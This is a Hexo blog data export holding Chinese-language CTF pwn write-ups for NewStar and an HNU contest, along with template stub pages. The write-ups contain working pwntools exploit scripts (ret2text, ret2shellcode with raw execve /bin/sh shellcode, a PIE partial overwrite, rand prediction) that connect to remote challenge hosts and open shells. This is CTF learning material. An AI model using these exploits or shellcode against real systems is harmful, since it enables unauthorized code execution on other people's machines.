{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[{"title":"所有标签","date":"2024-08-19T15:43:06.451Z","updated":"2024-08-19T15:43:06.451Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"","date":"2024-08-19T15:42:32.305Z","updated":"2024-08-19T15:42:32.305Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"下面写关于自己的内容"},{"title":"我的朋友们","date":"2024-08-19T15:43:46.641Z","updated":"2024-08-19T15:43:46.641Z","comments":true,"path":"friends/index.html","permalink":"http://example.com/friends/index.html","excerpt":"这里写友链上方的内容。","text":"这里写友链上方的内容。 这里可以写友链页面下方的文字备注，例如自己的友链规范、示例等。"},{"title":"所有分类","date":"2024-08-19T15:42:49.874Z","updated":"2024-08-19T15:42:49.874Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"Newstart week1","slug":"newstart-week1","date":"2024-08-30T01:29:50.981Z","updated":"2024-08-30T01:33:20.941Z","comments":true,"path":"2024/08/30/newstart-week1/","permalink":"http://example.com/2024/08/30/newstart-week1/","excerpt":"","text":"Ret2text很简单的栈溢出，checksec一下64位，没开pie，运行一下看看没什么特殊的，直接丢ida里反编译看一眼很明显的栈溢出，溢出大小为0x20+0x8，直接开始简单的脚本攻击以下是exp 1234567891011121314151617from pwn import *#p = process([&#x27;./Ret2text&#x27;])p = remote(&#x27;node5.buuoj.cn&#x27;, 29795)#p64中输入十六进制的值，即进行变量覆写#p.recvuntil(&quot;name:\\n&quot;)#payload=b&#x27;1956681178&#x27;#p.sendline(payload)#p.recvuntil(&quot;enge\\n&quot;)system_binsh_addr=0x4011FBsh=0x08048670padding=0x20+0x8payload=b&#x27;a&#x27; * padding + p64(system_binsh_addr)p.recvuntil(&#x27;magic&#x27;)p.send(payload)#p.recv()p.interactive() ezshellcode很简单的ret2shellcode，运行一下看看先和上一题怎么一样，差点以为下错文件，checksec一下吧OK呀，直接给我打开ida反编译看看怎么回事没有后门函数，但开辟了一段可执行段，可以往可执行段里写shellcode，很不错，那就直接开始吧！以下是exp 1234567891011121314151617181920from pwn import * context (os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;,&#x27;-l&#x27;,&#x27;140&#x27;]pwnfile = &#x27;./ezshellcode&#x27;elf = ELF(pwnfile)#libc = ELF(&#x27;&#x27;)#io = process(pwnfile)p = remote(&#x27;node5.buuoj.cn&#x27;,27667)#gdb.attach(io)pay = asm(shellcraft.sh()) #自动生成shellcode#pay = b&#x27;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05&#x27;#64位不可见shellcodep.recvuntil(&#x27;magic\\n&#x27;)p.send(pay) Newstart_shop整数溢出，checksec后，丢ida里反编译瞧瞧，发现是一堆的函数，点进去看看可以看到在判断的时候，是unsigned int类型，所以我们可以让money变成负数后，判断时就足够大了这个函数刚好可以做到，直接执行 p1eeechecksec一下，基本上能开的保护都开了运行一下看看运行一下也没什么东西，进ida里看看仔细看看有后门函数，正好也给了栈溢出的机会由于开了pie，基地址随机，只有后三位是固定的，所以可以通过栈溢出将返回地址后四位修改，看很多大佬的博客是通过爆破打通，这里我发现用64-68都打不通，69-6c甚至不需要爆破就能打通，由于read为程序最后一个函数，也调试不出来，希望有懂的大佬可以教教我以下是exp 12345678910111213141516171819&quot;&quot;&quot;from pwn import *p=process(&#x27;./aaa&#x27;)#p = remote(&#x27;node4.buuoj.cn&#x27;,25970)context(arch=&#x27;amd64&#x27;, log_level = &#x27;debug&#x27;) #p.sendafter(b&quot;A nice try to break pie!!!&quot;, b&#x27;\\x00&#x27;*0x28 + p8(0x6c))p.sendafter(b&quot;A nice try to break pie!!!&quot;, b&#x27;\\x00&#x27;*0x28 + b&#x27;d&#x27;)#print(p.sendline(b&#x27;cat flag&#x27;))p.interactive()&quot;&quot;&quot;from pwn import *context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;)p=process(&#x27;./aaa&#x27;)#p=remote(&#x27;node5.buuoj.cn&#x27;,26568)payload=b&#x27;a&#x27;*(32+8)+b&#x27;\\x69&#x27;p.sendlineafter(&#x27;!&#x27;,payload)p.interactive() Randomexp 12345678910111213141516171819from ctypes import *from pwn import * clibc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)#p=process(&#x27;./aaa&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,29112)context(arch=&#x27;amd64&#x27;, log_level = &#x27;debug&#x27;) clibc.srand(clibc.time(0))v =clibc.rand() p.sendlineafter(b&quot;can you guess the number?&quot;, str(v).encode()) p.sendline(b&#x27;/bin/sh&#x27;)p.sendline(b&#x27;cat flag&#x27;) p.interactive()","categories":[{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"}],"tags":[{"name":"write up","slug":"write-up","permalink":"http://example.com/tags/write-up/"},{"name":"复现","slug":"复现","permalink":"http://example.com/tags/%E5%A4%8D%E7%8E%B0/"}]},{"title":"Hello Hnu！","slug":"PWN-orange","date":"2024-08-19T15:46:26.240Z","updated":"2024-08-28T16:32:18.771Z","comments":true,"path":"2024/08/19/PWN-orange/","permalink":"http://example.com/2024/08/19/PWN-orange/","excerpt":"","text":"netcat通过题目不难看出，nc 一下即可 shellcode拿到题目第一步 checksec 一下打开的栈不可执行，丢 ida 里看看产生了一段可执行段，进 gdb 验证一下很明显产生了一段可执行段，注意到 read 限制了输入大小，所以只能自己制作一段以下是攻击脚本from LibcSearcher import LibcSearcherfrom pwn import * context(os&#x3D;’linux’, arch&#x3D;’amd64’, log_level&#x3D;’debug’)#p&#x3D;process(‘.&#x2F;aaa’)p &#x3D; remote(‘boom.01130328.xyz’, 39095)elf &#x3D; ELF(‘.&#x2F;pwn4’)rop &#x3D; ROP(‘.&#x2F;pwn4’)shellcode &#x3D; b’\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05’sh &#x3D; asm(shellcraft.sh())p.recvuntil(‘code:’)p.send(shellcode)p.interactive()","categories":[{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"}],"tags":[{"name":"比赛","slug":"比赛","permalink":"http://example.com/tags/%E6%AF%94%E8%B5%9B/"},{"name":"write up","slug":"write-up","permalink":"http://example.com/tags/write-up/"}]},{"title":"Hello World","slug":"hello-world","date":"2024-08-19T02:51:34.469Z","updated":"2024-08-19T02:51:34.469Z","comments":true,"path":"2024/08/19/hello-world/","permalink":"http://example.com/2024/08/19/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"}],"tags":[{"name":"write up","slug":"write-up","permalink":"http://example.com/tags/write-up/"},{"name":"复现","slug":"复现","permalink":"http://example.com/tags/%E5%A4%8D%E7%8E%B0/"},{"name":"比赛","slug":"比赛","permalink":"http://example.com/tags/%E6%AF%94%E8%B5%9B/"}]}